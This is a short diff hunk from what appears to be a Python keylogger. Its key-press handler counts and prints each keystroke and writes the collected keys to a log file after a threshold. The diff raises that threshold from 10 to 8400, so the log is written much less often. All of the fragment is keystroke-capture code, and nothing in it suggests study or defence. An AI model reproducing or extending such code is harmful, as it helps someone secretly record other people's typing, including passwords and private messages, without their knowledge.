@@ -12,7 +12,7 @@ def on_press(key):
     count += 1
     print("{0} key pressed on keyboard".format(key))
 
-    if count >= 10:
+    if count >= 8400:
         # This numerical value can be changed, however many keys are pressed, the log file will update
         count = 0
         write_file(keys)
